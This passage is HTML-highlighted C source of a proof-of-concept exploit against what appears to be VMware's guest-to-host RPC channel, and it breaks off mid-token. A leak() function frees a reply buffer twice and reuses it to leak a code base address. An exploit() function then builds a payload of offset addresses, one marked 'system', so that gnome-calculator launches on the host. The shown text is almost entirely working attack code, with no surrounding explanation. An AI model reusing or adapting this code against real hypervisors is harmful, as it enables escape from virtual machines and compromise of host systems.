punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strlen(s21) = 0x100</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token comment">//printf("Freeing the buffer....,bp:0x5555556DD3EF\n");</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now let's free\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then alloc channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check if channel 1's buffer == channel 0's buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check the heap, our target buffer in tcache now!\nTrying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFE0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token comment">//run_cmd(s1);</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this time free firstly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span 